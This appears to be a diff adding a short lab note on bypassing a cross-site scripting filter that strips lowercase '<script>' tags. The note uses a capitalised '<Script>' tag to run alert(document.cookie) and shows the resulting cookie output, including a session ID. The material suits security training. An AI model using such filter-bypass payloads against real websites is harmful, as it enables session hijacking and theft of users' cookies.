@@ -1,0 +1,9 @@
+Same input but with the s of <script> uppercase (<Script>). In this manner we will skip
+the input control on the string <script> (it will replace the string <script> with the
+string '').
+
+<Script>alert(document.cookie)</Script>
+
+#OUTPUT:
+
+security=medium; PHPSESSID=9cadd175e79f72e3bbe1ff97fc0b850e
